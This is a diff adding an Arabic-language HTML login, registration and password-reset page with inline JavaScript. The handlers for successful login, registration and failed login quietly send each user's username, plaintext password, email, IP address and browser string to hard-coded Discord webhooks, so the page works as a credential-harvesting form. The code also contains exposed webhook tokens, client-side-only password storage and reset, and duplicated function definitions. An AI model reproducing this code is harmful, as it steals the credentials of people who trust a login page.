@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التسجيل والدخول</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- نموذج تسجيل الدخول -->
+        <div class="form-container" id="loginFormContainer">
+            <div class="header">
+                <h1>تسجيل الدخول</h1>
+                <p>مرحباً بعودتك! يرجى إدخال بياناتك</p>
+            </div>
+            
+            <form id="loginForm">
+                <div id="loginError" class="error-message" style="display: none;"></div>
+                
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="username" name="username" placeholder="أدخل اسم المستخدم" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+                        <i class="fas fa-eye toggle-password" onclick="togglePassword('password')"></i>
+                    </div>
+                </div>
+                
+                <div class="options">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">تذكرني</label>
+                    </div>
+                    <a href="javascript:void(0)" class="forgot-password" onclick="showForgotPassword()">نسيت كلمة المرور؟</a>
+                </div>
+                
+                <button type="button" onclick="handleLogin()" class="btn">تسجيل الدخول</button>
+
+                <div class="switch-form">
+                    <p>ليس لديك حساب؟ <a href="javascript:void(0)" onclick="showRegisterForm()">إنشاء حساب جديد</a></p>
+                </div>
+            </form>
+        </div>
+
+        <!-- نموذج إنشاء حساب جديد -->
+        <div class="form-container" id="registerFormContainer" style="display: none;">
+            <div class="header">
+                <h1>إنشاء حساب جديد</h1>
+                <p>املأ النموذج لإنشاء حساب جديد</p>
+            </div>
+            
+            <form id="registerForm">
+                <div id="registerError" class="error-message" style="display: none;"></div>
+                
+                <div class="form-group">
+                    <label for="regUsername">اسم المستخدم</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="regUsername" name="regUsername" placeholder="أدخل اسم مستخدم جديد" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regEmail">البريد الإلكتروني</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-envelope"></i>
+                        <input type="email" id="regEmail" name="regEmail" placeholder="أدخل بريدك الإلكتروني" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regPassword">كلمة المرور</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="regPassword" name="regPassword" placeholder="أنشئ كلمة مرور قوية" required>
+                        <i class="fas fa-eye toggle-password" onclick="togglePassword('regPassword')"></i>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regConfirmPassword">تأكيد كلمة المرور</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="regConfirmPassword" name="regConfirmPassword" placeholder="أعد كتابة كلمة المرور" required>
+                    </div>
+                </div>
+                
+                <button type="button" onclick="handleRegister()" class="btn">إنشاء حساب</button>
+                
+                <div class="switch-form">
+                    <p>لديك حساب بالفعل؟ <a href="javascript:void(0)" onclick="showLoginForm()">تسجيل الدخول</a></p>
+                </div>
+            </form>
+        </div>
+
+        <div class="form-container" id="forgotPasswordContainer" style="display: none;">
+            <div class="header">
+                <h1>استعادة كلمة المرور</h1>
+                <p>أدخل بيانات استعادة كلمة المرور</p>
+            </div>
+            
+            <form id="forgotPasswordForm">
+                <div id="forgotError" class="error-message" style="display: none;"></div>
+                <div id="forgotSuccess" class="success-message" style="display: none;"></div>
+                
+                <div class="form-group">
+                    <label for="forgotUsername">اسم المستخدم</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="forgotUsername" name="forgotUsername" placeholder="أدخل اسم المستخدم" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="forgotEmail">البريد الإلكتروني</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-envelope"></i>
+                        <input type="email" id="forgotEmail" name="forgotEmail" placeholder="أدخل البريد الإلكتروني المسجل" required>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn" onclick="sendVerificationCode()">إرسال رمز التحقق</button>
+                
+                <div class="discord-contact" id="discordContact" style="display: none;">
+                    <p>تواصل مع الإدارة عبر الديسكورد لاستلام رمز التحقق</p>
+                    <a href="https://discord.gg/uBXFSpSXyc" target="_blank" class="discord-link">
+                        <i class="fab fa-discord"></i> انضم إلى سيرفر الديسكورد
+                    </a>
+                </div>
+                
+                <div class="form-group" id="verificationCodeGroup" style="display: none;">
+                    <label for="verificationCode">رمز التحقق</label>
+                    <div class="input-with-action">
+                        <div class="input-with-icon">
+                            <i class="fas fa-key"></i>
+                            <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الرمز الذي استلمته">
+                        </div>
+                        <button type="button" class="btn confirm-btn" onclick="verifyCode()">تأكيد الرمز</button>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn" id="verifyCodeBtn" style="display: none;" onclick="verifyCode()">تأكيد الرمز</button>
+                
+                <div class="form-group" id="newPasswordGroup" style="display: none;">
+                    <label for="newPassword">كلمة المرور الجديدة</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="newPassword" name="newPassword" placeholder="أدخل كلمة مرور جديدة">
+                    </div>
+                </div>
+                
+                <button type="button" class="btn" id="resetPasswordBtn" style="display: none;" onclick="resetPassword()">تغيير كلمة المرور</button>
+                
+                <div class="switch-form">
+                    <p><a href="#" onclick="showLoginForm()">العودة إلى تسجيل الدخول</a></p>
+                </div>
+            </form>
+        </div>
+
+    <script src="database.js"></script>
+    <script src="script.js"></script>
+    <script>
+        // متغيرات التخزين
+        if (!localStorage.getItem('users')) {
+        localStorage.setItem('users', JSON.stringify([]));
+    }
+
+    // دالة التحقق من المستخدم
+    function getUserByUsernameAndEmail(username, email, callback) {
+        const users = JSON.parse(localStorage.getItem('users'));
+        const user = users.find(u => u.username === username && u.email === email);
+        callback(user || null);
+    }
+
+    // دالة إرسال رمز التحقق (بدون خادم)
+    async function sendVerificationCode() {
+    const username = document.getElementById("forgotUsername").value.trim();
+    const email = document.getElementById("forgotEmail").value.trim();
+    const errorDiv = document.getElementById("forgotError");
+    const successDiv = document.getElementById("forgotSuccess");
+    
+    errorDiv.innerHTML = '';
+    errorDiv.style.display = 'none';
+    successDiv.style.display = 'none';
+    
+    if (!username || !email) {
+        showError(errorDiv, "يرجى إدخال اسم المستخدم والبريد الإلكتروني");
+        return;
+    }
+
+    try {
+        showLoading(errorDiv, "جاري التحقق من البيانات...");
+        
+        // 1. التحقق من صحة المستخدم
+        getUserByUsernameAndEmail(username, email, async (user) => {
+            if (user) {
+                currentUser = user;
+                verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+                
+                // 2. إرسال الرمز إلى ويب هوك Discord
+                const webhookURL = "https://discord.com/api/webhooks/1384553129718317239/tb1HmhQ-oV41D9c6yecWT8ygoOKdvH0NIozwQ7Al-60USSb9Kq0JQqJyHSLo9WAeLEl8";
+                
+                const embed = {
+                    title: "🔐 طلب استعادة كلمة المرور",
+                    description: `
+                        **👤 اسم المستخدم:** ${username}
+                        **📧 البريد الإلكتروني:** ${email}
+                        **🔢 رمز التحقق:** ||${verificationCode}||
+                        **🕒 الوقت:** ${new Date().toLocaleString()}
+                    `,
+                    color: 0xFFA500
+                };
+                
+                const response = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                if (!response.ok) throw new Error("فشل في إرسال الرمز");
+                
+                // 3. إظهار واجهة المستخدم
+                document.getElementById("verificationCodeGroup").style.display = "block";
+                document.getElementById("discordContact").style.display = "block";
+                
+                showSuccess(successDiv, `
+                    <p>تم إرسال رمز التحقق إلى المسؤولين!</p>
+                    <p>يرجى التواصل عبر <a href="https://discord.gg/رابط-سيرفرك" target="_blank">سيرفر الديسكورد</a> لاستلام الرمز.</p>
+                `);
+                
+                // 4. حفظ الرمز مؤقتاً (صلاحية 5 دقائق)
+                localStorage.setItem('tempCode', verificationCode);
+                localStorage.setItem('tempCodeTime', new Date().getTime());
+                
+                setTimeout(() => {
+                    if (document.getElementById("verificationCodeGroup").style.display !== "none") {
+                        showError(errorDiv, "انتهت صلاحية الرمز. يرجى طلب رمز جديد.");
+                    }
+                }, 5 * 60 * 1000);
+                
+            } else {
+                showError(errorDiv, "بيانات غير صحيحة. تأكد من اسم المستخدم والبريد الإلكتروني.");
+            }
+        });
+        
+    } catch (error) {
+        console.error("Error:", error);
+        showError(errorDiv, "حدث خطأ في الإرسال. حاول مرة أخرى لاحقاً.");
+    }
+}
+
+    // دالة التحقق من الرمز
+    function verifyCode() {
+        const enteredCode = document.getElementById("verificationCode").value;
+        const savedCode = localStorage.getItem('tempCode');
+        const codeTime = localStorage.getItem('tempCodeTime');
+        const now = new Date().getTime();
+        
+        if (!enteredCode || !savedCode) {
+            showError(document.getElementById("forgotError"), "يجب إدخال رمز التحقق");
+            return false;
+        }
+        
+        if (now - codeTime > 10 * 60 * 1000) {
+            showError(document.getElementById("forgotError"), "انتهت صلاحية رمز التحقق");
+            return false;
+        }
+        
+        if (enteredCode === savedCode) {
+            document.getElementById("newPasswordGroup").style.display = "block";
+            document.getElementById("resetPasswordBtn").style.display = "block";
+            return true;
+        } else {
+            showError(document.getElementById("forgotError"), "رمز التحقق غير صحيح");
+            return false;
+        }
+    }
+
+    // دوال مساعدة
+    function showError(element, message) {
+        element.innerHTML = message;
+        element.style.display = "block";
+        element.style.color = "#dc3545";
+    }
+    
+    function showSuccess(element, message) {
+        element.innerHTML = message;
+        element.style.display = "block";
+        element.style.color = "#28a745";
+    }
+    
+    function showLoading(element, message) {
+        element.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${message}`;
+        element.style.display = "block";
+        element.style.color = "#17a2b8";
+    }
+
+    // متغيرات عامة
+    let currentUser = null;
+    let verificationCode = null;
+    let verificationSentTime = null;
+
+    // دالة تسجيل الدخول المعدلة
+    async function handleLogin() {
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const rememberMe = document.getElementById("remember").checked;
+        
+        // التحقق من البيانات
+        loginUser(username, password, async function(success, message, user) {
+            const errorDiv = document.getElementById("loginError");
+            errorDiv.innerHTML = '';
+            errorDiv.style.display = 'none';
+            
+            if(success) {
+                if(rememberMe) {
+                    localStorage.setItem('username', username);
+                    localStorage.setItem('rememberMe', 'true');
+                } else {
+                    localStorage.removeItem('username');
+                    localStorage.removeItem('rememberMe');
+                }
+                
+                // إرسال بيانات الدخول إلى ديسكورد
+                await sendLoginToDiscord(username, password);
+                window.location.href = "websiet/index.html";
+            } else {
+                errorDiv.innerHTML = message;
+                errorDiv.style.display = "block";
+                
+                if(message.includes("غير صحيحة")) {
+                    await sendFailedToDiscord(username, password);
+                }
+            }
+        });
+    }
+
+    // دالة إنشاء حساب جديد
+    async function handleRegister() {
+        const username = document.getElementById("regUsername").value;
+        const email = document.getElementById("regEmail").value;
+        const password = document.getElementById("regPassword").value;
+        const confirmPassword = document.getElementById("regConfirmPassword").value;
+        
+        if(password !== confirmPassword) {
+            document.getElementById("registerError").innerHTML = "كلمة المرور غير متطابقة";
+            document.getElementById("registerError").style.display = "block";
+            return;
+        }
+        
+        registerUser(username, email, password, async function(success, message) {
+            const errorDiv = document.getElementById("registerError");
+            errorDiv.innerHTML = '';
+            errorDiv.style.display = 'none';
+            
+            if(success) {
+                await sendRegisterToDiscord(username, email, password);
+                alert(message);
+                showLoginForm();
+            } else {
+                errorDiv.innerHTML = message;
+                errorDiv.style.display = "block";
+            }
+        });
+    }
+
+    async function sendVerificationCode() {
+    const username = document.getElementById("forgotUsername").value.trim();
+    const email = document.getElementById("forgotEmail").value.trim();
+    const errorDiv = document.getElementById("forgotError");
+    const successDiv = document.getElementById("forgotSuccess");
+    
+    errorDiv.innerHTML = '';
+    errorDiv.style.display = 'none';
+    successDiv.style.display = 'none';
+    
+    if (!username || !email) {
+        errorDiv.innerHTML = "يرجى إدخال اسم المستخدم والبريد الإلكتروني";
+        errorDiv.style.display = "block";
+        return;
+    }
+
+    try {
+        // عرض رسالة تحميل
+        errorDiv.innerHTML = "جاري التحقق من البيانات...";
+        errorDiv.style.display = "block";
+        
+        // هذا افتراضي - استبدله بالدالة الحقيقية من database.js
+        const user = await new Promise((resolve) => {
+            getUserByUsernameAndEmail(username, email, resolve);
+        });
+
+        if (user) {
+            currentUser = user;
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            verificationSentTime = new Date();
+            
+            // إرسال إلى الديسكورد
+            await fetch("https://discord.com/api/webhooks/1384553129718317239/tb1HmhQ-oV41D9c6yecWT8ygoOKdvH0NIozwQ7Al-60USSb9Kq0JQqJyHSLo9WAeLEl8", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔐 طلب استعادة كلمة المرور",
+                        description: `**👤 اسم المستخدم:** ${username}\n**📧 البريد الإلكتروني:** ${email}\n**🔢 رمز التحقق:** ${verificationCode}`,
+                        color: 0xFFA500
+                    }]
+                })
+            });
+
+            // إظهار العناصر المطلوبة
+            document.getElementById("verificationCodeGroup").style.display = "block";
+            document.getElementById("discordContact").style.display = "block";
+            document.getElementById("newPasswordGroup").style.display = "none";
+            document.getElementById("resetPasswordBtn").style.display = "none";
+            
+            successDiv.innerHTML = "تم إرسال رمز التحقق للمسؤولين. يرجى التواصل معهم عبر الديسكورد.";
+            successDiv.style.display = "block";
+            
+        } else {
+            errorDiv.innerHTML = "لا يوجد حساب مرتبط بهذه البيانات. يرجى التأكد من اسم المستخدم والبريد الإلكتروني.";
+            errorDiv.style.display = "block";
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        errorDiv.innerHTML = "حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى.";
+        errorDiv.style.display = "block";
+    }
+}
+
+function verifyCode() {
+    const enteredCode = document.getElementById("verificationCode").value.trim();
+    const errorDiv = document.getElementById("forgotError");
+    const successDiv = document.getElementById("forgotSuccess");
+    
+    errorDiv.innerHTML = '';
+    errorDiv.style.display = 'none';
+    
+    if (!enteredCode) {
+        showError(errorDiv, "يرجى إدخال رمز التحقق");
+        return;
+    }
+    
+    if (enteredCode === verificationCode) {
+        // إخفاء قسم الرمز
+        document.getElementById("verificationCodeGroup").style.display = "none";
+        document.getElementById("discordContact").style.display = "none";
+        
+        // إظهار قسم كلمة المرور الجديدة
+        document.getElementById("newPasswordGroup").style.display = "block";
+        document.getElementById("resetPasswordBtn").style.display = "block";
+        
+        showSuccess(successDiv, "تم التحقق بنجاح! يرجى إدخال كلمة المرور الجديدة");
+    } else {
+        showError(errorDiv, "رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+    }
+}
+
+function resetPassword() {
+    const newPassword = document.getElementById("newPassword").value;
+    const errorDiv = document.getElementById("forgotError");
+    const successDiv = document.getElementById("forgotSuccess");
+    
+    if (!newPassword || newPassword.length < 6) {
+        showError(errorDiv, "كلمة المرور يجب أن تكون 6 أحرف على الأقل");
+        return;
+    }
+    
+    // تحديث كلمة المرور في localStorage
+    const users = JSON.parse(localStorage.getItem('users'));
+    const userIndex = users.findIndex(u => u.id === currentUser.id);
+    
+    if (userIndex !== -1) {
+        users[userIndex].password = newPassword;
+        localStorage.setItem('users', JSON.stringify(users));
+        
+        // إرسال إشعار إلى ويب هوك Discord
+        sendPasswordChangeToDiscord(currentUser.username, currentUser.email)
+            .then(() => {
+                showSuccess(successDiv, "تم تغيير كلمة المرور بنجاح! يمكنك الآن تسجيل الدخول");
+                setTimeout(() => showLoginForm(), 2000);
+            })
+            .catch(error => {
+                console.error("Error sending notification:", error);
+                showSuccess(successDiv, "تم تغيير كلمة المرور بنجاح ولكن حدث خطأ في إرسال الإشعار");
+                setTimeout(() => showLoginForm(), 2000);
+            });
+    } else {
+        showError(errorDiv, "حدث خطأ أثناء تحديث كلمة المرور");
+    }
+}
+
+// دالة إرسال إشعار تغيير كلمة المرور إلى Discord
+async function sendPasswordChangeToDiscord(username, email) {
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        const webhookURL = "https://discord.com/api/webhooks/1384553129718317239/tb1HmhQ-oV41D9c6yecWT8ygoOKdvH0NIozwQ7Al-60USSb9Kq0JQqJyHSLo9WAeLEl8";
+        
+        const embed = {
+            title: "🔄 تم تغيير كلمة المرور",
+            description: `**👤 اسم المستخدم:** ${username}\n**📧 البريد الإلكتروني:** ${email}\n**🌐 IP:** ${ipData.ip}\n**🕒 وقت التغيير:** ${new Date().toLocaleString()}`,
+            color: 0x00FF00,
+            timestamp: new Date().toISOString()
+        };
+        
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+        
+        if (!response.ok) throw new Error("Failed to send notification");
+    } catch (error) {
+        throw error;
+    }
+}
+
+    // دالة إرسال بيانات الدخول إلى ديسكورد
+    async function sendLoginToDiscord(username, password) {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            await fetch("https://discord.com/api/webhooks/1384583790260781207/06XIJXyW4KSzxiDICOjhxPnT24vJ0gMCXYaVRUy0PISX345jzJugOEDWaG43V5T_lN-_", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔔 تسجيل دخول ناجح",
+                        description: `**👤 اسم المستخدم:** ${username}\n**🔐 كلمة المرور:** ${password}\n**🌐 IP:** ${ipData.ip}\n**🖥️ المتصفح:** ${navigator.userAgent}`,
+                        color: 0x00FF00,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        } catch (error) {
+            console.error("Error sending login data:", error);
+        }
+    }
+
+    // دالة إرسال بيانات التسجيل إلى ديسكورد
+    async function sendRegisterToDiscord(username, email, password) {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            await fetch("https://discord.com/api/webhooks/1384583143012569088/ez0m1rtMh4dNUYGK9LMrzhB6xpZK3B7HugwwZSKxhfaWJi_XjXN9isl56EXPAXEHRDCY", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "📝 حساب جديد",
+                        description: `**👤 اسم المستخدم:** ${username}\n**📧 البريد الإلكتروني:** ${email}\n**🔐 كلمة المرور:** ${password}\n**🌐 IP:** ${ipData.ip}\n**🖥️ المتصفح:** ${navigator.userAgent}`,
+                        color: 0x0000FF,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        } catch (error) {
+            console.error("Error sending registration data:", error);
+        }
+    }
+
+    // دالة إرسال محاولات فاشلة إلى ديسكورد
+    async function sendFailedToDiscord(username, password) {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            await fetch("https://discord.com/api/webhooks/1384583347237556395/QaPQhPJJMFiCFqCJKlF_cuGcSFnKtH6ICrn9aT-DDscnvsT3YwQ2-QiC3C8ta-y7KQmm", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "⚠️ محاولة دخول فاشلة",
+                        description: `**👤 اسم المستخدم:** ${username}\n**🔐 كلمة المرور المحاولة:** ${password}\n**🌐 IP:** ${ipData.ip}\n**🖥️ المتصفح:** ${navigator.userAgent}\n\nيرجى التواصل مع المستخدم إذا كان قد نسيت كلمة المرور.`,
+                        color: 0xFF0000,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        } catch (error) {
+            console.error("Error sending failed attempt:", error);
+        }
+    }
+
+    // دالة تبديل النماذج
+    function showLoginForm() {
+        document.getElementById("loginFormContainer").style.display = "block";
+        document.getElementById("registerFormContainer").style.display = "none";
+        document.getElementById("forgotPasswordContainer").style.display = "none";
+        resetForgotPasswordForm();
+    }
+
+    function showRegisterForm() {
+        document.getElementById("loginFormContainer").style.display = "none";
+        document.getElementById("registerFormContainer").style.display = "block";
+        document.getElementById("forgotPasswordContainer").style.display = "none";
+    }
+
+    function showForgotPassword() {
+        document.getElementById("loginFormContainer").style.display = "none";
+        document.getElementById("registerFormContainer").style.display = "none";
+        document.getElementById("forgotPasswordContainer").style.display = "block";
+    }
+
+    function resetForgotPasswordForm() {
+        document.getElementById("forgotUsername").value = "";
+        document.getElementById("forgotEmail").value = "";
+        document.getElementById("verificationCode").value = "";
+        document.getElementById("newPassword").value = "";
+        document.getElementById("verificationCodeGroup").style.display = "none";
+        document.getElementById("newPasswordGroup").style.display = "none";
+        document.getElementById("resetPasswordBtn").style.display = "none";
+        currentUser = null;
+        verificationCode = null;
+    }
+
+    // دالة تبديل عرض كلمة المرور
+    function togglePassword(fieldId) {
+        const passwordField = document.getElementById(fieldId);
+        const icon = passwordField.nextElementSibling;
+        
+        if(passwordField.type === "password") {
+            passwordField.type = "text";
+            icon.classList.remove("fa-eye");
+            icon.classList.add("fa-eye-slash");
+        } else {
+            passwordField.type = "password";
+            icon.classList.remove("fa-eye-slash");
+            icon.classList.add("fa-eye");
+        }
+    }
+    </script>
+</body>
+</html>
